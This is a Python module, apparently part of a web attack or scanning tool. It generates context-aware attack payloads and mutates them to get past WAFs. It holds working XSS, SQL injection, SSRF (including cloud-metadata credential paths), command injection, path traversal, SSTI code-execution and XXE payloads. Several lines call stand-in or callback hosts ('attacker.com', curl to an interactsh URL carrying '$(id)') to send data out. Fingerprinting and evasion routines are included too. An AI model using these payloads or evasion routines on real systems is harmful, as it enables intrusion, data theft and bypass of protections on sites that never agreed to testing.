"""
core/payload_engine.py

Context-aware payload generation and mutation engine.
Generates attack payloads based on: vulnerability type, sink/context type,
WAF fingerprint, and encoding requirements.

Architecture reference: ARCHITECTURE.md § 7 "Payload Intelligence Engine"
"""

import hashlib
import logging
import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Optional

logger = logging.getLogger(__name__)


# ------------------------------------------------------------------
# Enums
# ------------------------------------------------------------------

class VulnType(str, Enum):
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    SQLI_BOOLEAN = "sqli_boolean"
    SQLI_ERROR = "sqli_error"
    SQLI_TIME = "sqli_time"
    SQLI_OOB = "sqli_oob"
    SQLI_UNION = "sqli_union"
    SSRF = "ssrf"
    COMMAND_INJECTION = "cmd_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSTI = "ssti"
    XXE = "xxe"
    OPEN_REDIRECT = "open_redirect"
    IDOR = "idor"
    CSRF = "csrf"
    JWT = "jwt"


class SinkType(str, Enum):
    # XSS sinks
    INNER_HTML = "innerHTML"
    DOCUMENT_WRITE = "document.write"
    EVAL = "eval"
    LOCATION_HREF = "location.href"
    JQUERY_HTML = "jquery.$html"
    REACT_DANGEROUS = "dangerouslySetInnerHTML"
    HTML_BODY = "html_body"
    HTML_ATTRIBUTE = "html_attribute"
    JS_STRING = "js_string"
    # Generic
    UNKNOWN = "unknown"


class WAFType(str, Enum):
    CLOUDFLARE = "cloudflare"
    AKAMAI = "akamai"
    AWS_WAF = "aws_waf"
    MODSECURITY = "modsecurity"
    IMPERVA = "imperva"
    F5 = "f5_bigip"
    NONE = "none"
    UNKNOWN = "unknown"


class EncodingType(str, Enum):
    NONE = "none"
    URL = "url"
    DOUBLE_URL = "double_url"
    HTML_ENTITY = "html_entity"
    UNICODE = "unicode"
    BASE64 = "base64"


# ------------------------------------------------------------------
# Data classes
# ------------------------------------------------------------------

@dataclass
class Payload:
    """A single generated/mutated payload with metadata."""
    value: str
    vuln_type: VulnType
    sink_type: SinkType = SinkType.UNKNOWN
    encoding: EncodingType = EncodingType.NONE
    waf_bypass: bool = False
    mutation_applied: str = ""
    description: str = ""
    confidence: float = 1.0
    payload_id: str = field(default_factory=lambda: "")

    def __post_init__(self):
        if not self.payload_id:
            self.payload_id = hashlib.md5(self.value.encode()).hexdigest()[:8]


@dataclass
class PayloadSet:
    """A ranked set of payloads for a given context."""
    vuln_type: VulnType
    sink_type: SinkType
    waf_type: WAFType
    payloads: list[Payload] = field(default_factory=list)

    def top(self, n: int = 5) -> list[Payload]:
        """Return the top N payloads sorted by confidence."""
        return sorted(self.payloads, key=lambda p: p.confidence, reverse=True)[:n]

    def all_values(self) -> list[str]:
        return [p.value for p in self.payloads]


# ------------------------------------------------------------------
# Payload Library
# ------------------------------------------------------------------

class PayloadLibrary:
    """
    Static library of base payloads organized by vuln_type × sink_type.
    These are the canonical baseline payloads before mutation.
    """

    XSS_PAYLOADS: dict[SinkType, list[str]] = {
        SinkType.INNER_HTML: [
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
        ],
        SinkType.HTML_ATTRIBUTE: [
            "\" onmouseover=\"alert(1)",
            "' onmouseover='alert(1)",
            "\" autofocus onfocus=\"alert(1)",
            '" onload="alert(1)',
            "\" onerror=\"alert(1)",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ],
        SinkType.JS_STRING: [
            "';alert(1)//",
            "\";alert(1)//",
            "\\';alert(1)//",
            "</script><script>alert(1)</script>",
            "'-alert(1)-'",
        ],
        SinkType.DOCUMENT_WRITE: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ],
        SinkType.EVAL: [
            "alert(1)",
            "1;alert(1)",
            "};alert(1)//",
        ],
        SinkType.LOCATION_HREF: [
            "javascript:alert(1)",
            "javascript:void(alert(1))",
            "data:text/html,<script>alert(1)</script>",
        ],
        SinkType.JQUERY_HTML: [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<script>alert(1)</script>",
        ],
        SinkType.REACT_DANGEROUS: [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ],
        SinkType.HTML_BODY: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'><script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
        ],
        SinkType.UNKNOWN: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "';alert(1)//",
            "\"><svg/onload=alert(1)>",
        ],
    }

    SQLI_PAYLOADS: dict[VulnType, list[str]] = {
        VulnType.SQLI_BOOLEAN: [
            "' AND 1=1--",
            "' AND 1=2--",
            "' OR 1=1--",
            "' OR 1=2--",
            "\" AND 1=1--",
            "\" AND 1=2--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "1 AND 1=1",
            "1 AND 1=2",
        ],
        VulnType.SQLI_ERROR: [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR CONVERT(int,'a')--",
            "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
            "' || TO_CHAR(1/0)--",
            "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)--",
        ],
        VulnType.SQLI_TIME: [
            "' AND SLEEP(5)--",
            "'; WAITFOR DELAY '0:0:5'--",
            "' AND pg_sleep(5)--",
            "'; SELECT SLEEP(5)--",
            "1' AND SLEEP(5) AND '1'='1",
            "' OR SLEEP(5)--",
            "\" AND SLEEP(5)--",
        ],
        VulnType.SQLI_UNION: [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION ALL SELECT NULL,NULL,NULL--",
            "' UNION SELECT 1,2,3--",
        ],
        VulnType.SQLI_OOB: [
            "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))--",
            "'; exec master..xp_dirtree '//attacker.com/a'--",
            "' OR 1=1 INTO OUTFILE '/tmp/test'--",
        ],
    }

    SSRF_PAYLOADS: list[str] = [
        "http://127.0.0.1/",
        "http://localhost/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "http://0.0.0.0/",
        "http://[::1]/",
        "http://2130706433/",   # 127.0.0.1 decimal
        "http://0x7f000001/",   # 127.0.0.1 hex
        "http://017700000001/", # 127.0.0.1 octal
        "dict://127.0.0.1:6379/",
        "gopher://127.0.0.1:6379/_%2A1%0D%0A",
        "file:///etc/passwd",
    ]

    CMD_INJECTION_PAYLOADS: list[str] = [
        "; sleep 5",
        "| sleep 5",
        "& sleep 5",
        "&& sleep 5",
        "\n sleep 5",
        "; ping -c 5 127.0.0.1",
        "| id",
        "; id",
        "$(sleep 5)",
        "`sleep 5`",
        "; cat /etc/passwd",
        "|| sleep 5",
    ]

    PATH_TRAVERSAL_PAYLOADS: list[str] = [
        "../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "../../../etc/passwd%00",
        "../../../windows/win.ini",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
    ]

    SSTI_PAYLOADS: list[str] = [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "*{7*7}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{% for x in [].class.base.subclasses() %}{{ x }}{% endfor %}",
    ]

    OPEN_REDIRECT_PAYLOADS: list[str] = [
        "https://evil.com",
        "//evil.com",
        "////evil.com",
        "/\\evil.com",
        "https:evil.com",
        "https://evil.com%2F%2F",
        "%68%74%74%70%73%3A%2F%2Fevil.com",
        "https://google.com@evil.com",
        "https://evil.com?legit.com",
        "javascript:alert(1)",
    ]

    XXE_PAYLOADS: list[str] = [
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root/>""",
        """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>""",
    ]


# ------------------------------------------------------------------
# WAF Fingerprinter
# ------------------------------------------------------------------

class WAFFingerprinter:
    """
    Identifies WAF type from HTTP response headers and body patterns.
    Used to select the appropriate evasion strategy.
    """

    # Signatures: header name → {value patterns → WAF type}
    HEADER_SIGNATURES: dict[str, dict[str, WAFType]] = {
        "server": {
            "cloudflare": WAFType.CLOUDFLARE,
        },
        "x-sucuri-id": {"": WAFType.IMPERVA},
        "x-iinfo": {"": WAFType.IMPERVA},
        "x-amzn-requestid": {"": WAFType.AWS_WAF},
        "x-amz-cf-id": {"": WAFType.AWS_WAF},
        "x-cdn": {"akamai": WAFType.AKAMAI},
        "x-check-cacheable": {"": WAFType.AKAMAI},
    }

    BODY_SIGNATURES: list[tuple[str, WAFType]] = [
        ("Attention Required! | Cloudflare", WAFType.CLOUDFLARE),
        ("The requested URL was rejected", WAFType.MODSECURITY),
        ("Request Rejected", WAFType.IMPERVA),
        ("Sorry, you have been blocked", WAFType.CLOUDFLARE),
        ("Access Denied", WAFType.MODSECURITY),
        ("IDS/IPS system", WAFType.F5),
        ("Your support ID is", WAFType.F5),
    ]

    @classmethod
    def fingerprint(cls, headers: dict[str, str], body: str = "") -> WAFType:
        """Identify WAF from response headers and body."""
        if not headers:
            return WAFType.UNKNOWN

        for header_name, patterns in cls.HEADER_SIGNATURES.items():
            header_val = headers.get(header_name, "").lower()
            for pattern, waf_type in patterns.items():
                if not pattern or pattern in header_val:
                    return waf_type

        body_lower = body.lower() if body else ""
        for pattern, waf_type in cls.BODY_SIGNATURES:
            if pattern.lower() in body_lower:
                return waf_type

        if headers.get("cf-ray"):
            return WAFType.CLOUDFLARE

        return WAFType.NONE


# ------------------------------------------------------------------
# Mutation Engine
# ------------------------------------------------------------------

class MutationEngine:
    """
    Applies evasion transformations to base payloads.
    Selects mutation strategy based on detected WAF type.
    """

    # WAF-specific bypass strategies
    WAF_STRATEGIES: dict[WAFType, list[str]] = {
        WAFType.CLOUDFLARE: ["case_mutation", "comment_inject", "unicode_escape", "html_entity"],
        WAFType.AKAMAI: ["space_substitute", "null_byte", "double_url"],
        WAFType.AWS_WAF: ["case_mutation", "url_encode", "double_url"],
        WAFType.MODSECURITY: ["comment_inject", "case_mutation", "space_substitute", "url_encode"],
        WAFType.IMPERVA: ["unicode_escape", "html_entity", "double_url"],
        WAFType.F5: ["case_mutation", "null_byte", "url_encode"],
        WAFType.NONE: [],
        WAFType.UNKNOWN: ["case_mutation", "url_encode"],
    }

    @classmethod
    def mutate(cls, payload: str, waf_type: WAFType, vuln_type: VulnType) -> list[Payload]:
        """Generate mutated variants of a payload for the given WAF."""
        strategies = cls.WAF_STRATEGIES.get(waf_type, [])
        mutations: list[Payload] = []

        for strategy in strategies:
            mutated_value = cls._apply(payload, strategy)
            if mutated_value and mutated_value != payload:
                mutations.append(Payload(
                    value=mutated_value,
                    vuln_type=vuln_type,
                    waf_bypass=True,
                    mutation_applied=strategy,
                    description=f"WAF bypass via {strategy}",
                    confidence=0.7,
                ))

        return mutations

    @classmethod
    def _apply(cls, payload: str, strategy: str) -> str:
        """Apply a single mutation strategy."""
        if strategy == "case_mutation":
            return cls._case_mutate(payload)
        elif strategy == "comment_inject":
            return cls._comment_inject(payload)
        elif strategy == "unicode_escape":
            return cls._unicode_escape(payload)
        elif strategy == "html_entity":
            return cls._html_entity(payload)
        elif strategy == "url_encode":
            return urllib.parse.quote(payload, safe="")
        elif strategy == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
        elif strategy == "space_substitute":
            return payload.replace(" ", "/**/")
        elif strategy == "null_byte":
            return payload + "\x00"
        return payload

    @staticmethod
    def _case_mutate(payload: str) -> str:
        """Alternate case of alpha characters."""
        result = []
        upper = True
        for ch in payload:
            if ch.isalpha():
                result.append(ch.upper() if upper else ch.lower())
                upper = not upper
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def _comment_inject(payload: str) -> str:
        """Inject SQL/JS comments to break keyword detection."""
        # For SQL payloads
        for keyword in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]:
            payload = re.sub(
                keyword, f"{keyword[0]}/**/{''.join(keyword[1:])}", payload, flags=re.IGNORECASE
            )
        # For XSS: inject between tag and attribute
        payload = re.sub(r"<(\w+)", r"<\1<!---->", payload)
        return payload

    @staticmethod
    def _unicode_escape(payload: str) -> str:
        """Convert alphabetic chars to \\uXXXX unicode escapes."""
        result = []
        for ch in payload:
            if ch.isalpha():
                result.append(f"\\u{ord(ch):04x}")
            else:
                result.append(ch)
        return "".join(result)

    @staticmethod
    def _html_entity(payload: str) -> str:
        """Convert special chars to HTML entities."""
        mapping = {
            "<": "&lt;",
            ">": "&gt;",
            '"': "&quot;",
            "'": "&#x27;",
            "/": "&#x2F;",
        }
        result = []
        for ch in payload:
            result.append(mapping.get(ch, ch))
        return "".join(result)


# ------------------------------------------------------------------
# Main Payload Engine
# ------------------------------------------------------------------

class PayloadEngine:
    """
    Central payload generation engine.

    Usage:
        engine = PayloadEngine()
        payload_set = engine.generate(
            vuln_type=VulnType.XSS_REFLECTED,
            sink_type=SinkType.INNER_HTML,
            waf_type=WAFType.CLOUDFLARE,
        )
        for payload in payload_set.top(10):
            print(payload.value)
    """

    def __init__(self):
        self._library = PayloadLibrary()
        self._mutation = MutationEngine()
        self._fingerprinter = WAFFingerprinter()
        self._cache: dict[str, PayloadSet] = {}

    def generate(
        self,
        vuln_type: VulnType,
        sink_type: SinkType = SinkType.UNKNOWN,
        waf_type: WAFType = WAFType.NONE,
        interactsh_url: Optional[str] = None,
        max_payloads: int = 20,
    ) -> PayloadSet:
        """
        Generate a ranked payload set for the given context.

        Args:
            vuln_type: Type of vulnerability being tested.
            sink_type: JavaScript/HTML sink type (for XSS).
            waf_type: Detected WAF type (for bypass mutations).
            interactsh_url: OOB callback URL (for SSRF/SQLI OOB/blind CMDi).
            max_payloads: Maximum number of payloads to return.

        Returns:
            PayloadSet sorted by confidence.
        """
        cache_key = f"{vuln_type}:{sink_type}:{waf_type}:{interactsh_url}"
        if cache_key in self._cache:
            return self._cache[cache_key]

        base_payloads = self._select_base_payloads(vuln_type, sink_type, interactsh_url)
        payload_objects: list[Payload] = []

        for value in base_payloads:
            payload_objects.append(Payload(
                value=value,
                vuln_type=vuln_type,
                sink_type=sink_type,
                confidence=1.0,
                description="Base payload",
            ))

        # Add WAF bypass mutations
        if waf_type not in (WAFType.NONE, WAFType.UNKNOWN):
            for value in base_payloads[:5]:  # Mutate only top 5 base payloads
                mutations = self._mutation.mutate(value, waf_type, vuln_type)
                payload_objects.extend(mutations)

        # Add encoding variants for XSS
        if vuln_type in (VulnType.XSS_REFLECTED, VulnType.XSS_STORED, VulnType.XSS_DOM):
            for value in base_payloads[:3]:
                payload_objects.append(Payload(
                    value=urllib.parse.quote(value, safe=""),
                    vuln_type=vuln_type,
                    sink_type=sink_type,
                    encoding=EncodingType.URL,
                    confidence=0.6,
                    description="URL-encoded variant",
                ))

        # Deduplicate
        seen: set[str] = set()
        unique_payloads: list[Payload] = []
        for p in payload_objects:
            if p.value not in seen:
                seen.add(p.value)
                unique_payloads.append(p)

        result = PayloadSet(
            vuln_type=vuln_type,
            sink_type=sink_type,
            waf_type=waf_type,
            payloads=unique_payloads[:max_payloads],
        )

        self._cache[cache_key] = result
        logger.debug(
            f"[PayloadEngine] Generated {len(result.payloads)} payloads "
            f"for {vuln_type} / {sink_type} / WAF={waf_type}"
        )
        return result

    def fingerprint_waf(self, headers: dict[str, str], body: str = "") -> WAFType:
        """Fingerprint WAF from response headers/body."""
        return self._fingerprinter.fingerprint(headers, body)

    def get_ssrf_payloads(self, interactsh_url: Optional[str] = None) -> list[str]:
        """Return SSRF payloads, optionally with interactsh callback."""
        payloads = list(self._library.SSRF_PAYLOADS)
        if interactsh_url:
            payloads.insert(0, f"http://{interactsh_url}/ssrf-test")
            payloads.insert(1, f"https://{interactsh_url}/ssrf-test")
        return payloads

    def get_cmd_payloads(self, interactsh_url: Optional[str] = None) -> list[str]:
        """Return command injection payloads, optionally with OOB callback."""
        payloads = list(self._library.CMD_INJECTION_PAYLOADS)
        if interactsh_url:
            payloads.insert(0, f"; curl http://{interactsh_url}/cmdi-$(id)")
            payloads.insert(1, f"| curl http://{interactsh_url}/cmdi-$(id)")
            payloads.insert(2, f"$(curl http://{interactsh_url}/cmdi-$(id))")
        return payloads

    def _select_base_payloads(
        self,
        vuln_type: VulnType,
        sink_type: SinkType,
        interactsh_url: Optional[str],
    ) -> list[str]:
        """Select raw payload strings for the given context."""
        lib = self._library

        if vuln_type in (VulnType.XSS_REFLECTED, VulnType.XSS_STORED, VulnType.XSS_DOM):
            return lib.XSS_PAYLOADS.get(sink_type, lib.XSS_PAYLOADS[SinkType.UNKNOWN])

        if vuln_type == VulnType.SQLI_BOOLEAN:
            return lib.SQLI_PAYLOADS[VulnType.SQLI_BOOLEAN]
        if vuln_type == VulnType.SQLI_ERROR:
            return lib.SQLI_PAYLOADS[VulnType.SQLI_ERROR]
        if vuln_type == VulnType.SQLI_TIME:
            return lib.SQLI_PAYLOADS[VulnType.SQLI_TIME]
        if vuln_type == VulnType.SQLI_UNION:
            return lib.SQLI_PAYLOADS[VulnType.SQLI_UNION]
        if vuln_type == VulnType.SQLI_OOB:
            payloads = lib.SQLI_PAYLOADS[VulnType.SQLI_OOB]
            if interactsh_url:
                return [p.replace("attacker.com", interactsh_url) for p in payloads]
            return payloads

        if vuln_type == VulnType.SSRF:
            return self.get_ssrf_payloads(interactsh_url)

        if vuln_type == VulnType.COMMAND_INJECTION:
            return self.get_cmd_payloads(interactsh_url)

        if vuln_type == VulnType.PATH_TRAVERSAL:
            return lib.PATH_TRAVERSAL_PAYLOADS

        if vuln_type == VulnType.SSTI:
            return lib.SSTI_PAYLOADS

        if vuln_type == VulnType.XXE:
            payloads = list(lib.XXE_PAYLOADS)
            if interactsh_url:
                payloads = [p.replace("attacker.com", interactsh_url) for p in payloads]
            return payloads

        if vuln_type == VulnType.OPEN_REDIRECT:
            return lib.OPEN_REDIRECT_PAYLOADS

        return []
